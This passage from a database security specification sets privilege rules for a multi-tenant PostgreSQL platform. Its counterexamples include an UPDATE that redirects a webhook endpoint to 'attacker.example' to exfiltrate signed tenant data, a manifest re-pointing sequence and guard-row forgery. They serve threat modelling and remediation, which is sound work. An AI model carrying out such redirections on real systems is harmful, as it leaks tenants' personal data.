### 8.3 Rules for privileged functions

| ID | Rule |
|---|---|
| PRV-16 [FROZEN] | Every `SECURITY DEFINER` function declares an explicit `search_path`. Static reading of the 49 migrations that contain such functions found none without one. Functions that call `gen_uuid_v7()` include `public`; that is the one permitted non-schema entry (5K §10.12; 6J ADR-6J-14). |
| PRV-17 [7I] | Because the functions are owned by a `BYPASSRLS` role, RLS does not apply inside them. Every function therefore does exactly one of three things: (a) it takes an organization and compares it with `organization.current_tenant_id()` before touching a row (tenant-scoped callers); (b) it is cross-tenant, is granted only to a narrow principal, and returns identifiers and state only; or (c) it is a **claim-fenced return**: cross-tenant, granted to exactly one dedicated principal, returning content only for rows that the same call atomically claimed for that caller, with no argument through which the caller can select a row, an organization or a filter. Class (c) has one member in V1, `audit.fn_claim_outbox_events`, whose arguments are a worker label, a limit and a lease timeout. A function that is none of the three is not permitted. |
| PRV-18 [7I] | **No authority from arguments.** A function never accepts, as an argument, a value that decides its own authorization: not a role name, not a "is admin" flag, not a claim sequence the caller did not obtain from the database, not an operator identity that the database cannot tie to a stored approval. Fences are values the database issued (claim sequence, operation ID and plan fingerprint) and re-reads under lock. |
| PRV-19 [7I] | Caller identity inside a `SECURITY DEFINER` function is `session_user`, never `current_user` (the precedent of `072_5J`). A function restricted to one principal checks `session_user` in addition to its grant. |
| PRV-20 [7I] | `REVOKE ALL … FROM PUBLIC` on every new function and relation, then explicit grants. No grant to `PUBLIC`. |
| PRV-21 [7I] | The frozen unfenced delivery functions and the frozen `fn_update_inbound_event_status` stay in place and are **revoked from every runtime principal** once their fenced successors exist. They are superseded, never edited (7H §17.3). Until then the dispatcher is not activatable (AB-7H-02). |
| PRV-22 [7I] | A new partition of any partitioned relation receives the same revocations as its parent. The `108_5B6` / `109_5B7` pattern (walk `pg_inherits`, revoke, then assert) is mandatory for every relation in this section. |
| PRV-23 [7I] | No function returns a payload, a body, material, a processing input, a URL or a secret reference to a caller that has not first proven, to the database, a claim on that exact item. |
| PRV-28 [7I] | **`CREATE OR REPLACE` keeps the old ACL.** A governed migration that supersedes a function under the same signature inherits every existing grant. Each such migration therefore states the complete target ACL with explicit `REVOKE … FROM` every role that held it and from `PUBLIC`, then the grants, then an assertion block that fails the migration if `has_function_privilege` is true for any role outside the target set. |
| PRV-29 [7I] | **A table revocation never closes a `SECURITY DEFINER` path.** Every relation whose direct privilege this document withdraws is accompanied by the list of functions that read it and by their target ACLs (§8.5 for the outbox, §8.6 for deliveries). |

### 8.4 The questions §3.4 of the assignment asks about 7D, answered against the physical schema

| Claim to prove | Verdict | Evidence and condition |
|---|---|---|
| Producer transactions cannot create forged cross-tenant work | **True when a tenant context is set; not true when none is set** | `trg_outbox_tenant_check` (A-4, A-5). Closed by IR-03: an insert with no tenant context is accepted only for the enumerated platform-scoped type |
| Relay identities cannot read unrelated business data | **Not true today** | The relay would connect as `app_worker`, which reads tenant tables and the whole outbox. Closed by IR-01, IR-04 (PRV-03) |
| Audit dispatch is durable where mandatory | **True by design** | No mandatory audit is dispatched; it is written in the business transaction (7D §36; §19.3) |
| Async audit work cannot disappear after a pre-enqueue crash | **True by elimination** | There is no post-commit enqueue on which a mandatory audit depends (7D AUD-7D-02). The 84 routes still need the implementation and documentation alignment of 7D IO-7D-16 |
| Database cleanup cannot destroy required legal or recovery evidence | **True by rule; enforcement is a gap** | 7D CLN-02, CLN-04; 7G ILK-01 … ILK-08. Today the only deleter is `app_platform_admin` with raw `DELETE`. Closed by IR-07 (guarded cleanup that applies the interlock) and IR-04 (raw `DELETE` withdrawn) |
| No relay or worker principal acquires unintended `SECURITY DEFINER` privilege | **Not true today for the relay functions; a gap for audit platform events** | The mark functions are CAS-guarded, but the claim function returns full rows to any holder of `EXECUTE`, and `app_worker` and `app_platform_admin` both hold it (A-11). Closed by §8.5. `fn_insert_audit_event` lets any `app_worker` session write a platform-scoped audit event (`072_5J`), which is broader than any single worker needs; IR-15 narrows the caller list to the principals that have a platform-scoped action to record |

### 8.5 Outbox function closure (P1-7I-R01)

**Physical facts (`077_5J1`, static reading).** `fn_claim_outbox_events(TEXT, INTEGER, INTEGER)` is `SECURITY DEFINER`, returns `SETOF audit.domain_event_outbox` by `RETURNING *`, and takes no row selector. `fn_mark_outbox_published(UUID, TEXT)` and `fn_mark_outbox_failed(UUID, TEXT, TEXT, TIMESTAMPTZ)` are compare-and-swap on (`id`, `claimed_by`, `status = 'CLAIMED'`). Each has `REVOKE ALL … FROM PUBLIC` and `GRANT EXECUTE … TO app_worker, app_platform_admin`. The table has no RLS; `SELECT` is held by `app_readonly`, `app_worker`, `app_platform_admin`.

**Alternative paths checked (static reading of all 112 migrations).**

| Path | Finding |
|---|---|
| `PUBLIC` | Revoked on all three functions in `077_5J1`. No migration contains `GRANT … TO PUBLIC`. Tables carry no default `PUBLIC` privilege |
| Role membership | No migration grants one role to another, and no role is created `IN ROLE`. The eight roles are flat |
| Schema-wide grants | `074_5J` grants `SELECT ON ALL TABLES IN SCHEMA audit` to `app_readonly` and `app_platform_admin`; it ran before the outbox existed and does not cover it. No later schema-wide grant on `audit` exists |
| Default privileges | No `ALTER DEFAULT PRIVILEGES` statement exists in any migration |
| Views | No view selects from the outbox. The only views are the three `identity.v_platform_safe_*` of `109_5B7` |
| Other functions | The only other objects that touch the outbox are the insert trigger, `identity.fn_platform_revoke_all_sessions` and the `110_5C2` producer; each only inserts. None returns a row |

This is text inspection, not a catalogue query. VT-59 and VT-61 are the catalogue assertions that must confirm it on the executed schema.

| ID | Rule |
|---|---|
| OBX-01 [7I] | **Final callers.** `fn_claim_outbox_events`, `fn_mark_outbox_published`, `fn_mark_outbox_failed`: the relay principal, and no other role. Not `app_worker`, not `app_api`, not `app_readonly`, not `app_platform_admin`, not the tooling, sweeper, maintenance, gateway or journal principals. |
| OBX-02 [7I] | The governed migration issues, for each of the three signatures: `REVOKE ALL … FROM PUBLIC`; `REVOKE EXECUTE … FROM app_worker, app_platform_admin`; `GRANT EXECUTE … TO` the relay role; then the assertion of PRV-28. It does so in the same migration that creates the relay role, so there is no interval in which nobody can publish. |
| OBX-03 [7I] | The same migration issues `REVOKE SELECT ON audit.domain_event_outbox FROM app_worker, app_readonly, app_platform_admin` and `REVOKE UPDATE, DELETE … FROM app_platform_admin`, the latter only together with the guarded cleanup of IR-07 so that cleanup remains possible. The relay role receives **no** table privilege. |
| OBX-04 [FROZEN] | **The payload-returning claim stays.** 7D CLM-06 and MAT-08 require the relay to project `payload::text` from the claim's result set and to embed it byte-exact. The publication boundary is not replaced by an identifier-only claim with a second payload fetch: that would add a function, a round trip and a new fenced-load contract for no reduction of exposure, because the relay must hold every payload it publishes. |
| OBX-05 [7I] | **Defence in depth.** The superseding bodies of the three functions raise unless `session_user` is the relay role (PRV-19). An accidental later grant therefore still fails. The claim, lease, compare-and-swap, reclaim-after-timeout and `FAILED`-at-budget logic of `077_5J1` is carried over statement for statement; 7D's claim, lease, publication and crash-recovery semantics are unchanged. |
| OBX-06 [7I] | **Reconciliation with INV-04.** The relay reads payloads of every tenant over time; it is in the trusted computing base for the outbox, as it must be to publish. What bounds it: content only for rows the call itself claimed (PRV-17 c); no argument selects a tenant or a row; no table privilege anywhere; no tenant table; no key-service permission; no Redis read (§9.2). |
| OBX-07 [7I] | **The relay cannot read unrelated business data.** The relay role is `LOGIN`, `NOSUPERUSER`, `NOBYPASSRLS`, and a member of no role; it has `USAGE` on schema `audit` only, no table, sequence or column privilege in any schema, and `EXECUTE` on exactly the three functions plus the `pg_catalog` built-ins. Any pre-existing function left executable by `PUBLIC` in a schema the role can use is found by VT-61 and either revoked from `PUBLIC` or recorded as harmless with a reason. |
| OBX-08 [7I] | **Bounded arguments.** The superseding claim clamps `p_limit` and `p_claim_timeout_seconds` to configured ranges, so a defective relay cannot claim the whole table or steal a live lease with a zero timeout. The ranges are the migration's ([REC] limit ≤ 500; timeout ≥ 60 s). This narrows inputs and changes no semantics inside the range 7D uses. |
| OBX-09 [7I] | Repair publication (7G R4, R5) does not use these functions. It reads a captured source or a `FAILED` row through the ledger's own guarded functions (PRV-09). The platform administrator's "manual / emergency" use of the relay functions (`077_5J1` L127 comment) ends; emergency publication is a governed R5. |

**The counterexample, closed.** `app_worker` with no table `SELECT` calls the claim function: PostgreSQL checks the function's ACL before executing it; `app_worker` is not in the ACL, is not a member of a role that is, and `PUBLIC` holds nothing; the result is `42501`, and no row is locked, claimed or returned. If a later migration mistakenly re-granted `EXECUTE`, the body would raise on `session_user`. The relay role calls the same function, receives the rows it claimed, publishes them and marks them with the compare-and-swap functions exactly as 7D specifies. Tests: VT-59, VT-60, VT-61.

### 8.6 The administrator's read of webhook deliveries (P1-7I-R02)

**Physical facts.** `063_5I` L77 grants `SELECT, INSERT, UPDATE, DELETE` on `webhooks.webhook_deliveries` to `app_platform_admin`. `066_5I` L7 grants the same four on **all tables in schema `webhooks`**, which includes every partition that existed then. `109_5B7` Part G revokes `INSERT, UPDATE, DELETE` on the parent and each partition and **asserts that `SELECT` is still held** on each. The role therefore has **table-level** `SELECT` on the parent and on every partition, and it has `BYPASSRLS`.

**Why the earlier wording was wrong.** PostgreSQL has no column-level denial. `REVOKE SELECT (payload_json) …` removes a column-level grant that does not exist and leaves the table-level grant, which covers every column. The text that proposed "column-level revocation" would have changed nothing.

| ID | Rule |
|---|---|
| PAS-01 [7I] | **Revoke the broad grant.** `REVOKE SELECT ON webhooks.webhook_deliveries FROM app_platform_admin`, and the same on **every** partition, found by walking `pg_inherits` recursively from the parent, the default partition included. `INSERT`, `UPDATE`, `DELETE` stay revoked (`109_5B7`). |
| PAS-02 [7I] | **Grant columns, on the parent only.** `GRANT SELECT (<columns of PAS-03>) ON webhooks.webhook_deliveries TO app_platform_admin`. Partitions receive **no** privilege for this role: a query through the parent is checked against the parent's privileges only, so the 6M routes work, and a direct query of a partition is denied outright. This is the column-grant pattern of `108_5B6`, tightened by not repeating the grant on partitions. A view was considered (the `109_5B7` Part F precedent) and not chosen: it would add an object and an ownership chain without a stronger guarantee here. |
| PAS-03 [7I] | **The metadata columns**, an upper bound for the 6M DTO: `id`, `organization_id`, `webhook_endpoint_id`, `event_type`, `event_id`, `status`, `attempt_count`, `max_attempts`, `next_attempt_at`, `last_attempt_at`, `last_response_code`, `completed_at`, `failure_reason`, `replay_of_delivery_id`, `replay_count`, `last_replayed_at`, `resolved_at`, `created_at`, and the future `body_state`, `body_erased_at` (PBR-02). **Not granted:** `payload_json`, `last_response_body_preview`, `payload_hash`, `claimed_by`, `claimed_at`, and every future lineage or fingerprint column unless a governed change adds it here. `failure_reason` is granted on the ground that 7H HTP-14 makes it a closed category code; the fenced closure functions enforce that, and until they exist the route is not activatable (AB-7H-02). |
| PAS-04 [7I] | **Proof of denial.** After PAS-01 and PAS-02, for `app_platform_admin`: `SELECT payload_json FROM webhooks.webhook_deliveries`, `SELECT last_response_body_preview …` and `SELECT * …` each fail with `42501`, because a statement needs `SELECT` on every column it references and the role holds neither the table-level privilege nor a grant on those columns. A `WHERE`, `ORDER BY` or join on a non-granted column fails the same way. `has_table_privilege(…, 'SELECT')` is false; `has_column_privilege(…, 'payload_json', 'SELECT')` is false; `has_column_privilege(…, 'status', 'SELECT')` is true. `BYPASSRLS` bypasses row policies, not column privileges. |
| PAS-05 [7I] | **Parent, current partitions, future partitions.** The migration ends with an assertion block in the `108_5B6` / `109_5B7` form: parent has no table-level `SELECT` and no privilege on the excluded columns; every partition has **no** privilege of any kind for the role. A new partition has none by default (no default privileges exist, §8.5); every migration or job that creates a partition repeats the assertion in the same transaction (PRV-22). An attached pre-existing table is revoked before `ATTACH`. |
| PAS-06 [7I] | **Inheritance.** The role is a member of no role and no role is a member of it (§8.5). `PUBLIC` holds nothing on the relation. The assertion block checks `pg_auth_members` for the role and fails the migration if a membership appears. |
| PAS-07 [7I] | **Indirect paths.** Functions on which the role holds `EXECUTE` today and that read the relation: `fn_claim_delivery` (returns identifiers), `fn_delivery_succeeded` (returns nothing; **writes** the preview), `fn_delivery_failed` (returns a status), `fn_replay_webhook_delivery` (returns an identifier; copies a body to a new row for the tenant's endpoint; tenant-context guarded since `101_5I1`), `fn_update_inbound_event_status`. None returns a body or a preview. All five are revoked from the role (PRV-14), because none belongs to a 6M surface and two of them write. No view exposes the relation. A future function that returns either column must not be granted to the role; VT-62 scans the catalogue for functions executable by the role whose result type includes those columns or the table's row type. |
| PAS-08 [7I] | **Break-glass.** The six purposes of `105_5B4` are `SUPPORT_GENERAL`, `SUPPORT_BILLING`, `SUPPORT_ORG_LIFECYCLE`, `SUPPORT_QUOTA`, `SENSITIVE_MEDIA_ACCESS`, `SUPPORT_SECURITY_INCIDENT`. None is mapped to a webhook body by any frozen contract, and none is mapped here. A break-glass grant is an application-level record; it does not change a PostgreSQL privilege. There is therefore **no** platform-administrator read of a webhook body or preview in V1, with or without break-glass. Adding one would be a new 6M guarded function, a new purpose and an owner decision. |
| PAS-09 [7I] | **6M monitoring preserved.** `GET /platform-admin/webhooks/failed` and `/dead-letter` (6M §55) read status, counts, times, the response code and the failure category across tenants. Every one of those is in PAS-03. The routes must name their columns; a `SELECT *` implementation fails closed. |
| PAS-10 [7I; amended by OD-7I-30] | **Changed by the seventh remediation.** The earlier text left `app_readonly`, `app_api` and `app_worker` with table-level `SELECT` on this relation, on the ground that forced RLS confines them to a tenant context. RLS scopes rows by tenant; it says nothing about a row's retention deadline, and a table-level `SELECT` lets any holder read `payload_json` and the preview of an overdue row directly, around every guarded function (P1-7I-R21). The three roles lose table-level `SELECT` on the parent and on every partition and receive column grants that exclude the two content columns; the tenant's `webhook:read` path obtains content only through the guarded read function (CAG-06, CAG-07; IR-52). The administrator's table privileges on `webhooks.webhook_endpoints`, which include `target_url` (class `SEC`, FLD-22) and the signing-secret reference, were left for 7L by the first remediation. That was a freeze blocker (P1-7I-R10) and is closed in §8.7. |

**Migration and regression requirement (IR-09), in order:** revoke the five functions; revoke table-level `SELECT` on parent and every partition; grant the PAS-03 columns on the parent; run the assertion block; then VT-62 and VT-63. Rolling back restores the `109_5B7` state and re-opens F-7I-03, so the downgrade is itself gated.

### 8.7 Platform-administrator privileges on tenant-owned 5I objects (P1-7I-R10; OD-7I-17)

Nothing in this section exists. It is a requirement on a future governed migration (IR-39).

**The counterexample, on the executed schema.** Organization A owns an `ACTIVE` endpoint. A `PENDING` delivery for `contact.created` carries a phone number, a name and an email address (7H §5.3). A holder of the `app_platform_admin` login runs `UPDATE webhooks.webhook_endpoints SET target_url = 'https://attacker.example/x' WHERE id = …`. The statement succeeds: `062_5I` L36 grants the role `SELECT, INSERT, UPDATE, DELETE` on the table, `066_5I` L7 grants the same on all tables in schema `webhooks`, and the role is `BYPASSRLS` (`001_5B`), so the forced tenant policy does not apply. `chk_we_target_https` is satisfied. At the next attempt the dispatcher's admission reads the live row (7H SUB-04, OD-7H-01) and sends the body, signed with the tenant's own secret, to the attacker. The role never read `payload_json`, so PAS-01 … PAS-10 do not help.

**Which boundary applies today.** None prevents it. The egress controls of 7H §14.4 admit any public HTTPS host. The future `config_revision` (7H MR-7H-11) is incremented by the database on any update, so the redirected attempt is *attributable* (its admission names a revision with no audit row, 7H DST-07), which is detection after the body has left. The destination fingerprint is supplied by the caller and cannot be verified by the database. The only preventive boundary available is the table and function ACL.

**Physical inventory (static reading of `060_5I` … `066_5I`, `101_5I1`, `109_5B7`).** "Tenant-owned" means: `organization_id UUID NOT NULL` and forced RLS with the tenant policy.

| Relation | Tenant-owned? | Administrator today (source) | Frozen 6M use | Administrator after IR-39 |
|---|---|---|---|---|
| `webhooks.webhook_endpoints` | Yes (`062_5I` L5, L32) | `SELECT, INSERT, UPDATE, DELETE` (`062_5I` L36; `066_5I` L7) | None (6M §57 residual note) | **None** |
| `webhooks.inbound_webhook_events` | Yes (`062_5I` L40, L61) | All four (`062_5I` L66; `066_5I` L7) | None | **None** |
| `webhooks.webhook_deliveries` and partitions | Yes (`063_5I` L7, L72) | `SELECT` only since `109_5B7` Part G | Two read-only routes (6M §55) | Column `SELECT` on PAS-03 metadata, parent only (§8.6; IR-09). Unchanged here |
| `integrations.integration_connections` | Yes (`061_5I` L5, L46) | All four (`061_5I` L50; `066_5I` L6) | None | **None** |
| `integrations.integration_health` | Yes (`061_5I` L55, L73) | All four (`061_5I` L77; `066_5I` L6) | None | **None** |
| `integrations.oauth_attempts` | Yes (`061_5I` L109, L127) | All four (`061_5I` L131; `066_5I` L6) | None | **None** |
| `plugins.plugin_installations` | Yes (`065_5I` L5, L56) | All four (`065_5I` L60; `066_5I` L8) | None | **None** |
| `plugins.plugin_executions` | Yes (`065_5I` L137, L168) | All four (`065_5I` L166; `066_5I` L8) | None | **None** |
| `integrations.integration_definitions` | No: global catalogue | `SELECT, INSERT, UPDATE` (`060_5I` L35), plus `DELETE` by `066_5I` L6 | Platform catalogue management | **Unchanged** |
| `plugins.plugins`, `plugins.plugin_versions` | No: global catalogues | `SELECT, INSERT, UPDATE` (`064_5I` L31, L67), plus `DELETE` by `066_5I` L8 | Platform catalogue management | **Unchanged** |

The tenant-owned 5I relations number eight. One (`webhook_deliveries`) was already narrowed by `109_5B7` and §8.6. The remaining **seven** are the scope of this section: the endpoint table and six siblings. (The owner's approval speaks of five sibling tables, following the grouping in the question put to the owner, which listed the integration health and OAuth tables as one item. Condition 1 of that approval makes the physical evidence authoritative, and the evidence shows six.) `analytics.webhook_delivery_stats_daily` belongs to 5J, holds aggregates only, and is outside this scope; 6M §57 lists it beside these tables and it is recorded for 7L.

| ID | Rule |
|---|---|
| ADM-01 [OD-7I-17] | **No direct access.** `REVOKE ALL PRIVILEGES` on each of the seven relations of ADM-02 from `app_platform_admin`. `SELECT` is included: no frozen 6M route reads any of them (6M §55 reads deliveries only; §57 says of these tables that they "are not read by any endpoint this document defines"), and `target_url`, `signing_secret_ref`, `previous_signing_secret_ref` and both `credential_ref` columns are class `SEC`. |
| ADM-02 [OD-7I-17] | **The seven relations**, named, never selected by schema membership: `webhooks.webhook_endpoints`, `webhooks.inbound_webhook_events`, `integrations.integration_connections`, `integrations.integration_health`, `integrations.oauth_attempts`, `plugins.plugin_installations`, `plugins.plugin_executions`. The three catalogue relations and `webhook_deliveries` are explicitly excluded from this statement. No `REVOKE … ON ALL TABLES IN SCHEMA` is used: it would also strip the catalogues. |
| ADM-03 [7I] | **Partitions.** None of the seven is partitioned in migrations `001` – `112`. The migration nevertheless walks `pg_inherits` for each and applies the same revocation to any child, so a later partitioning cannot reopen the `108_5B6` defect class (PRV-22). |
| ADM-04 [7I] | **Sequences and columns.** All seven use UUID keys; no sequence is owned by any of them (static reading). The assertion block checks `has_sequence_privilege` for every sequence in the three schemas and `has_column_privilege` for every column of the seven relations, and fails if either is true. A column grant would survive a table-level `REVOKE` only if one existed; none does in `001` – `112`. |
| ADM-05 [OD-7I-17] | **Tenant-mutating functions.** The role holds `EXECUTE` on 21 `SECURITY DEFINER` functions that insert into or update these relations. Their tenant-forgery guard compares an argument with `organization.current_tenant_id()`, which reads a session setting the role can set to any organization, so the guard does not constrain it. `EXECUTE` is revoked from `app_platform_admin` on each: `integrations.fn_create_integration_connection`, `fn_redeem_oauth_attempt`, `fn_rotate_integration_credential` (`061_5I`); `plugins.fn_create_plugin_installation`, `fn_activate_plugin`, `fn_uninstall_plugin`, `fn_upgrade_plugin` (`065_5I`); `integrations.fn_activate_integration_connection`, `fn_fail_integration_connection`, `fn_degrade_integration_connection`, `fn_disconnect_integration_connection`, `fn_update_integration_connection_config`, `fn_record_integration_sync_result`, `fn_redeem_oauth_callback_state`, `fn_fail_oauth_callback_state`, `fn_record_oauth_exchange_failure`; `plugins.fn_suspend_plugin_installation`, `fn_reactivate_plugin_installation`, `fn_update_plugin_installation_config`, `fn_rotate_plugin_installation_credential`; and `webhooks.fn_rotate_webhook_secret` (`101_5I1`). The five delivery and inbound-status functions are already revoked by PAS-07. |
| ADM-06 [OD-7I-17; amended by OD-7I-20] | **The function the second remediation kept, and why that is withdrawn.** `integrations.fn_integrations_anonymize_org(UUID)` is granted to `app_platform_admin` alone (`061_5I` L178). Its body (`061_5I` L166 – L176, read statically) redacts `external_account_name`, clears `external_account_ref` and moves the organization's connections to `DISCONNECTED` with reason `gdpr_erasure`; its one argument is the organization. It cannot redirect anything, which is why the second remediation kept it. That reasoning addressed redirection only. The function irreversibly severs a tenant's integrations and erases its account references on a bare UUID, with no audit write and no authorization check, and the earlier sentence here that "the 6M caller supplies both" was wrong: no 6M caller exists (§8.12). The third review rated this a freeze blocker (P1-7I-R12). The grant is **revoked** (OEA-01) and the mutation is reachable only through the erasure operation of §8.12. Owner condition 8 of OD-7I-17 ("guarded functions only where a frozen contract needs one") is now met by that guarded path, not by this grant. |
| ADM-07 [7I] | **Indirect paths checked (static).** `PUBLIC`: every 5I function carries `REVOKE ALL … FROM PUBLIC`; no migration grants to `PUBLIC`. Membership: the roles are flat (§8.5). Default privileges: none exist. Views: none over these relations. Other definer functions that write them: none outside ADM-05 and the worker functions already revoked by PAS-07. Break-glass: a grant of any `105_5B4` purpose is an application record and confers no PostgreSQL privilege (PAS-08). `BYPASSRLS` bypasses row policies, not table or function ACLs. The role cannot `SET ROLE` to another role because it is a member of none. This is text inspection; VT-82 is the catalogue assertion. |
| ADM-08 [OD-7I-17] | **No platform endpoint operation in V1.** No platform-administrator route, function or emergency-disable capability for endpoints, installations or connections is introduced. 6M `DBGAP-6M-04` already records platform replay as not built. A future operation needs a new guarded 6M function, a break-glass purpose and an owner decision. An organization that must be stopped is suspended through the frozen organization lifecycle, which holds its deliveries at admission (7H ADM-01, T-09). |
| ADM-09 [FROZEN] | **Tenant management preserved.** `app_api` keeps `SELECT, INSERT, UPDATE` on `webhook_endpoints` (`062_5I` L34) under forced RLS and `EXECUTE` on `fn_rotate_webhook_secret`; the 6J webhook-endpoint routes under `webhook:manage` (among them the `PATCH` 6J-020 and the test route 6J-025) are unchanged. The same holds for integration connections and plugin installations through their 6J functions, which stay granted to `app_api`. |
| ADM-10 [FROZEN + 7I] | **Permitted changes are audited by the frozen mechanism.** A tenant's change of a destination or a secret reference increments `config_revision` in the mutating transaction and writes its audit row in that same transaction (7H MR-7H-11, DST-04, DST-05; 7D OD-7D-02). After ADM-01 the only sessions able to perform such an update are those of the tenant path, so "a revision with no audit row" stops being an expected administrator artefact and becomes an integrity alarm (HE-7J-7I-11). 7I adds no audit action and changes no revision rule. |
| ADM-11 [OD-7I-18] | **Workers.** `app_worker` holds `SELECT, INSERT, UPDATE` on `webhook_endpoints` and `EXECUTE` on `fn_rotate_webhook_secret` today. No frozen worker path creates or re-targets an endpoint: fan-out reads endpoints, and the dispatcher's `last_delivery_at` touch runs through its own guarded function (PRV-06). `INSERT` and `UPDATE` on the table and `EXECUTE` on the rotation function are therefore withdrawn from `app_worker` and are **not** granted to the Integrations context principal, which keeps `SELECT` for fan-out (CTX-05). If the IR-40 inventory finds a frozen worker path that must mutate an endpoint, it receives a guarded Integrations-owned function that cannot set `target_url` or a secret reference from an argument. |
| ADM-12 [7I] | **Migration order and atomicity.** One transaction: revoke the 21 functions; revoke all on the seven relations and any children; run the assertion block (`has_table_privilege`, `has_column_privilege`, `has_sequence_privilege`, `has_function_privilege` all false for the role on the scoped objects; true for the catalogue privileges; **false for `fn_integrations_anonymize_org`**, for this role and for every other login role (OEA-01); `pg_auth_members` empty for the role). A failed assertion aborts the migration. Privileges are transactional DDL, so there is no interval in which a partial state is visible. Concurrent sessions of the role lose the privilege at their next statement. |
| ADM-13 [7I] | **Tenant isolation.** The change removes a cross-tenant write path and adds none. Tenant-scoped roles are untouched; RLS is untouched. |
| ADM-14 [7I] | **What is not claimed.** A stolen `app_api` credential can set any tenant context and use the tenant's own management path (RR-01). That path increments the revision and, when driven through the application, writes the audit row; a raw `UPDATE` under that credential leaves the unaudited-revision alarm of ADM-10. This is the frozen tenancy model's residual, stated in T-7I-22, and it is not the platform-administrator path this finding is about. |
| ADM-15 [7I] | **A pinned plugin version cannot be re-pointed through the catalogue** (found during the fourth remediation; F-7I-30). The administrator keeps `SELECT, INSERT, UPDATE` on `plugins.plugin_versions` (`064_5I` L67) as the frozen reviewer of plugin versions. The manifest declares the plugin's `base_url` (6J §30), and an installation pins a version by identifier (`065_5I`). `fn_pv_manifest_immutable` (`064_5I` L53 – L63) refuses a manifest change only while `OLD.approved_at IS NOT NULL`. Three statements defeat it: set `status = 'PENDING_REVIEW', approved_at = NULL` (the manifest is unchanged, so the trigger passes and `chk_pv_approved_has_at` is satisfied); change the manifest (now `OLD.approved_at` is null); approve again. Every tenant installation pinned to that version then calls the attacker's host with the tenant's data, which is the R10 redirection by another route. **Rule:** approval is one-way. A superseding trigger on `plugins.plugin_versions` makes `manifest`, `plugin_id`, `semver`, `approved_at` and `approved_by_ref` immutable once `approved_at` has ever been set, and admits only `APPROVED → DEPRECATED` for the status of such a row; `DELETE` on the relation is revoked from the role (`066_5I` L8), and the foreign key from installations already forbids deleting a pinned version. This is the frozen invariant INV-PLUG-01 ("manifest is immutable once approved") enforced as written. Catalogue management by the platform is otherwise unchanged (OD-7I-17, scope condition 6): the administrator can still submit, approve, reject and deprecate versions, and a tenant reaches a new version only by its own upgrade action, which the role cannot perform (ADM-05). `integrations.integration_definitions` and `plugins.plugins` carry no destination or credential column (`060_5I`, `064_5I`, read statically). Requirement: IR-48. Test: VT-110. |

**The counterexample, closed.** With IR-39 applied, the same `UPDATE` under `app_platform_admin` fails with `42501 permission denied for table webhook_endpoints` before any row is locked: the role has no table or column privilege, is a member of no role, and `PUBLIC` holds nothing. `SELECT set_config('app.tenant_id', …); SELECT webhooks.fn_rotate_webhook_secret(…)` fails with `42501 permission denied for function`. No break-glass grant changes either result. The dispatcher continues to read the tenant's own configuration. Until IR-39 exists the attack succeeds, and AB-7I-01 therefore blocks the dispatcher. Tests: VT-82, VT-83, VT-84.

### 8.8 Per-context database principals (P1-7I-R11, part A; OD-7I-18)

Nothing in this section exists. It is a requirement on a future governed migration (IR-40) and it needs controlled errata to 5B and 7F (ERR-7I-14).

**Feasibility of the forgery, per consumer, on the executed schema.** `organization.current_tenant_id()` returns the session setting `app.tenant_id` (`001_5B` L86 – L92); any session can set it. Every durable consumer would connect as `app_worker`.

| CON | Guard (7F §28.1) | What `app_worker` holds today | Forgery by a holder of any `app_worker` credential |
|---|---|---|---|
| CON-04 CRM | `crm.fn_claim_event` / `pk_event_consumer_dedup` | `SELECT, INSERT, DELETE` on `crm.event_consumer_dedup`; `EXECUTE` on `crm.fn_claim_event` (`094_5D3` L91, L137) | **Feasible.** Insert the ledger row; the genuine delivery is "not inserted" and visible in the tenant context (7F EID-06); no call history is written |
| CON-06 Billing | `uq_ue_idempotency` | `SELECT, INSERT` on `billing.usage_events` (`050_5H` L39) | **Feasible, and worse.** Insert a row with the key `<event_id>:<metric>` and any quantity; the genuine insert conflicts and the forged quantity is billed |
| CON-07 Analytics | `fn_ingest_analytics_event`, `fn_claim_projection_slot` | `EXECUTE` on both (`068_5J` L111, L124) | **Feasible** |
| CON-02 Compliance | `uq_compliance_policy_active` | `SELECT, INSERT, UPDATE` on `organization.compliance_policies` (`004_5B` L50) | **Feasible.** The forged row is itself the policy |
| CON-05, CON-11 Campaign | `call_jobs`, `campaign_contacts` and `csv_import_jobs` compare-and-swap | `SELECT, INSERT, UPDATE` on all three (`028_5E`, `030_5E`, `031_5E`) | **Feasible.** Move the row to the target state |
| CON-03, CON-09 | IC-4, no per-event guard | — | No guard row to forge; the acknowledgement rested on attestation (GWY-09) |
| CON-01, CON-08 | IC-5, no local guard | — | Same |
| CON-10 Integrations | No physical guard exists (7F) | — | Not applicable until its fan-out claim exists; then as CON-04 |

So the reviewed counterexample is real for six of the eleven consumers, and the gateway's guard-proof branch (GWY-08 a) would have accepted the forged row. For the IC-2 and IC-3 classes the same tables are also written by `app_api` under the tenant API (6C, 6H), which part B addresses.

| ID | Rule |
|---|---|
| CTX-01 [OD-7I-18] | **Nine principals.** One PostgreSQL login per consuming bounded context: identity, compliance, crm, campaign, billing, analytics, voice, knowledge, integrations. Each is `LOGIN`, `NOSUPERUSER`, `NOBYPASSRLS`, `NOCREATEROLE`, a member of no role and with no member. No account exists per tenant, per event, per group or per worker instance (conditions A-1, A-4). |
| CTX-02 [OD-7I-18] | **Grant set of a context principal.** Exactly: (a) the guard objects and guard functions of its own consumers (7F §28 "Guard (exact)"); (b) the business-effect objects its own frozen handlers write (the 7F §28 cards); (c) `SELECT` on the objects its handlers read under the tenant context, including another context's objects where a frozen port reads them in the handler transaction; (d) `INSERT` on the outbox, for handlers that emit events (7F TXA-01); (e) `audit.fn_insert_audit_event`; (f) the ledger worker functions (IR-10 a); (g) `fn_record_completion` (CEV-05); (h) schema `USAGE` as needed. Nothing else (A-2). |
| CTX-03 [OD-7I-18] | **The cross-context rule.** For every guard object *g* of context Y: `INSERT`, `UPDATE`, `DELETE`, and `EXECUTE` on any function that writes *g*, are held by Y's principal, by `app_api` where a frozen API contract writes the same relation, by `app_platform_admin` only where a 6M function requires it, and by **no other role**. In particular not by another context's principal and not by `app_worker` (A-3). Item (c) of CTX-02 never includes a write. |
| CTX-04 [7I] | **A frozen port that writes across contexts.** If the IR-40 inventory finds a handler of context X that, by a frozen contract, changes state owned by Y inside its transaction, X does not receive DML on Y's relation. Y exposes a guarded function for that one change, granted to X's principal, which cannot write a row that serves as a guard for one of Y's consumers. No such port is asserted or denied here; the inventory decides, and an unresolved case keeps AB-7I-11 closed. |
